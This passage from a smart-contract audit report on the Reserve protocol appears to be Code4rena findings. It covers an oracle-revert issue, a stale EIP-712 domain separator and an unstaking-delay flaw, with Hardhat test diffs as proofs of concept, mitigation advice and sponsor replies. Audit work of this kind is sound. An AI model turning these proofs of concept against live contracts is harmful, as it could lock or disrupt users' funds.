class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">aaveAsset</span><span class=\"mtk1\">.</span><span class=\"mtk11\">oracleError</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk12\">erc20_</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">aaveAsset</span><span class=\"mtk1\">.</span><span class=\"mtk11\">erc20</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk12\">maxTradeVolume_</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">aaveAsset</span><span class=\"mtk1\">.</span><span class=\"mtk11\">maxTradeVolume</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk12\">oracleTimeout_</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">aaveAsset</span><span class=\"mtk1\">.</span><span class=\"mtk11\">oracleTimeout</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">aaveAsset</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">AssetFactory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">priceTimeout_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">chainlinkFeed_</span><span class=\"mtk1\"> ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">oracleError_</span><span class=\"mtk1\"> ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">erc20_</span><span class=\"mtk1\"> ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">maxTradeVolume_</span><span class=\"mtk1\"> ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">oracleTimeout_</span><span class=\"mtk1\">  ) </span><span class=\"mtk15\">as</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Asset</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">aaveAsset</span><span class=\"mtk1\">.</span><span class=\"mtk11\">refresh</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span></code></pre>\n<p>Modification of <code>hardhat.config.ts</code> to set it to the Polygon network:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/hardhat.config.ts b/hardhat.config.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index f1886d25..53565799 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/hardhat.config.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/hardhat.config.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -24,18 +24,19 @@ const TIMEOUT = useEnv(&#39;SLOW&#39;) ? 3_000_000 : 300_000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> const src_dir = `./contracts/${useEnv(&#39;PROTO&#39;)}`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> const settings = useEnv(&#39;NO_OPT&#39;) ? {} : { optimizer: { enabled: true, runs: 200 } }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+let recentBlockNumber = 38231040;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+let jan6Block = 37731612; // causes &#39;missing trie node&#39; error</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> const config: HardhatUserConfig = {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   defaultNetwork: &#39;hardhat&#39;,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   networks: {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     hardhat: {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       // network for tests/in-process stuff</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      forking: useEnv(&#39;FORK&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        ? {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            url: MAINNET_RPC_URL,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            blockNumber: Number(useEnv(&#39;MAINNET_BLOCK&#39;, forkBlockNumber[&#39;default&#39;].toString())),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-          }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        : undefined,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      gas: 0x1ffffffff,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      forking: {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          url: &quot;https://rpc.ankr.com/polygon&quot;,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          // blockNumber: recentBlockNumber</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          },</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          gas: 0x1ffffffff,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       blockGasLimit: 0x1fffffffffffff,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       allowUnlimitedContractSize: true,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     },</span></span></span></code></pre>\n<p>Output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  1) Assets contracts #fast</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">       Deployment</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         Deployment should setup assets correctly:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     Error: Transaction reverted without a reason string</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    at Asset.refresh (contracts/plugins/assets/Asset.sol:102)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    at processTicksAndRejections (node:internal/process/task_queues:95:5)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    at async HardhatNode._mineBlockWithPendingTxs (node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:1802:23)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    at async HardhatNode.mineBlock (node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:491:16)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    at async EthModule._sendTransactionAndReturnHash (node_modules/hardhat/src/internal/hardhat-network/provider/modules/eth.ts:1522:18)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    at async HardhatNetworkProvider.request (node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:118:18)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    at async EthersProviderWrapper.send (node_modules/@nomiclabs/hardhat-ethers/src/internal/ethers-provider-wrapper.ts:13:20)</span></span></code></pre>\n<p>Notes:</p>\n<ul>\n<li>Chainlink list deprecating oracles only till deprecation, afterwards they’re removed from the website. For this reason I wasn’t able to trace deprecated oracles on the mainnet</li>\n<li>I was trying to prove this worked before deprecation, however, I kept getting the ‘missing trie node’ error when forking the older block. This isn’t essential for the PoC so I decided to give up on it for now (writing this PoC was hard enough on its own).</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>At <code>OracleLib.price()</code> catch the error and check if the error data is empty and the aggregator is set to the zero address, if it is a revert with a custom error. Otherwise revert with the original error data (this can be done with assembly).</p>\n<p>Another approach might be to check in the <code>refresh()</code> function that the <code>tryPrice()</code> function didn’t revert due to out of gas error by checking the gas before and after (in case of out of gas error only ~1/64 of the gas-before would be left). The advantage of this approach is that it would catch also other errors that might revert with empty data.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/234#issuecomment-1404422733\">tbrent (Reserve) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>I did not know this! Nice find.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-18-if-name-is-changed-then-the-domain-separator-would-be-wrong\" style=\"position:relative;\"><a href=\"#m-18-if-name-is-changed-then-the-domain-separator-would-be-wrong\" aria-label=\"m 18 if name is changed then the domain separator would be wrong permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/211\">[M-18] If name is changed then the domain separator would be wrong</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/211\">fs0c</a></em></p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L803\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L803</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L791\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L791</a></p>\n<p>In <code>StRSR.sol</code> the <code>_domainSeparatorV4</code> is calculated using the EIP-721 standard, which uses the <code>name</code> and <code>version</code> that are passed in the init at the function call <code>__EIP712_init(name, \"1\");</code></p>\n<p>Now, governance can change this <code>name</code> anytime using the following function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setName</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">name_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">governance</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">name</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">name_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>After that call the domain separator would still be calculated using the old name, which shouldn’t be the case.</p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The permit transactions and vote delegation would be reverted if the domain separator is wrong.</p>\n<h3 id=\"recommendation\" style=\"position:relative;\"><a href=\"#recommendation\" aria-label=\"recommendation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>While changing the name in setName function, update the domain separator.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/211\">tbrent (Reserve) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed\">tbrent (Reserve) mitigated</a>:</strong></p>\n<blockquote>\n<p>This PR removes the ability to change StRSR token’s name and symbol: <a href=\"https://github.com/reserve-protocol/protocol/pull/614\">reserve-protocol/protocol#614</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/7\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/62\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/42\">AkshaySrivastav</a>.</p>\n<hr>\n<h2 id=\"m-19-in-case-that-unstakingdelay-is-decreased-users-who-have-previously-unstaked-would-have-to-wait-more-than-unstakingdelay-for-new-unstakes\" style=\"position:relative;\"><a href=\"#m-19-in-case-that-unstakingdelay-is-decreased-users-who-have-previously-unstaked-would-have-to-wait-more-than-unstakingdelay-for-new-unstakes\" aria-label=\"m 19 in case that unstakingdelay is decreased users who have previously unstaked would have to wait more than unstakingdelay for new unstakes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/210\">[M-19] In case that <code>unstakingDelay</code> is decreased, users who have previously unstaked would have to wait more than <code>unstakingDelay</code> for new unstakes</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/210\">0xA5DF</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/151\">Soosh</a></em></p>\n<p>Users who wish to unstake their RSR from StRSR have to first unstake and then wait <code>unstakingDelay</code> till they can actually withdraw their stake.</p>\n<p>The <code>unstakingDelay</code> can change by the governance.</p>\n<p>The issue is that when the <code>unstakingDelay</code> is decreased - users that have pending unstakes (aka drafts) would have to wait till the old delay has passed for the pending draft (not only for their pending drafts, but also for any new draft they wish to create. e.g. if the unstaking delay was 6 months and was changed to 2 weeks, if a user has a pending draft that was created a month before the change the user would have to wait at least 5 months since the change for every new draft).</p>\n<h3 id=\"proof-of-concept-18\" style=\"position:relative;\"><a href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following PoC shows an example similar to above:</p>\n<ul>\n<li>Unstaking delay was 6 months</li>\n<li>Bob unstaked (create a draft) 1 wei of RSR</li>\n<li>Unstaking delay was changed to 2 weeks</li>\n<li>Both Bob and Alice unstake their remaining stake</li>\n<li>Alice can withdraw her stake after 2 weeks</li>\n<li>Bob has to wait 6 months in order to withdraw both that 1 wei and the remaining of the stake</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/ZZStRSR.test.ts b/test/ZZStRSR.test.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index f507cd50..3312686a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/ZZStRSR.test.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/ZZStRSR.test.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -599,6 +599,8 @@ describe(`StRSRP${IMPLEMENTATION} contract`, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let amount2: BigNumber</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let amount3: BigNumber</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      let sixMonths = bn(60*60*24*30*6);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       beforeEach(async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         stkWithdrawalDelay = bn(await stRSR.unstakingDelay()).toNumber()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -608,18 +610,56 @@ describe(`StRSRP${IMPLEMENTATION} contract`, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         amount3 = bn(&#39;3e18&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Approve transfers</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        await rsr.connect(addr1).approve(stRSR.address, amount1)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await rsr.connect(addr1).approve(stRSR.address, amount1.add(1))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         await rsr.connect(addr2).approve(stRSR.address, amount2.add(amount3))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Stake</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        await stRSR.connect(addr1).stake(amount1)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await stRSR.connect(addr1).stake(amount1.add(1))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         await stRSR.connect(addr2).stake(amount2)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         await stRSR.connect(addr2).stake(amount3)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // Unstake - Create withdrawal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        await stRSR.connect(addr1).unstake(amount1)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        let sixMonths = bn(60*60*24*30*6);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // gov thinks it&#39;s a good idea to set delay to 6 months</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await expect(stRSR.connect(owner).setUnstakingDelay(sixMonths))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        .to.emit(stRSR, &#39;UnstakingDelaySet&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        .withArgs(config.unstakingDelay, sixMonths);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Poor Bob created a draft when unstaking delay was 6 months</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await stRSR.connect(addr1).unstake(bn(1))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // gov revise their previous decision and set unstaking delay back to 2 weeks</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await expect(stRSR.connect(owner).setUnstakingDelay(config.unstakingDelay))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        .to.emit(stRSR, &#39;UnstakingDelaySet&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        .withArgs(sixMonths, config.unstakingDelay);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // now both Bob and Alice decide to unstake</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await stRSR.connect(addr1).unstake(amount1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await stRSR.connect(addr2).unstake(amount2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      it(&#39;PoC user 1 can\\&#39;t withdraw&#39;, async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Get current balance for user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        const prevAddr1Balance = await rsr.balanceOf(addr1.address)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // 6 weeks have passed, much more than current delay</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await advanceTime(stkWithdrawalDelay * 3)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Alice can happily withdraw her stake</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await stRSR.connect(addr2).withdraw(addr2.address, 1)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Bob can&#39;t withdraw his stake and has to wait 6 months</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Bob is now very angry and wants to talk to the manager</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await expect(stRSR.connect(addr1).withdraw(addr1.address, 